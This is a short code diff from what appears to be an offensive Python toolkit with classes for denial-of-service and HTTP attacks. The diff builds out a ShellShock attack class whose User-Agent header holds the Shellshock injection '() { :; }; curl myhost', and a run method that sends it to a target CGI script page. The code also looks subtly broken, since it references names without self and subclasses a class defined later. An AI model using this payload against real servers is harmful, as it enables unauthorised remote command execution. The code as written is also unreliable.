@@ -56,8 +56,16 @@ class DOS():
 
 # class Attack():
 
-class ShellShock(Attack):
+class ShellShock(HTTP):#Attack):
     HTTP_HEADER = {"User-Agent":"() { :; }; curl myhost"}
+
+    def __init__(self, host, script_page):
+        self.host = HTTP(host, header=HTTP_HEADER)
+        self.target = script_page
+
+    def run(self):
+        self.host.GET(target)
+
 
 
 class HTTP():
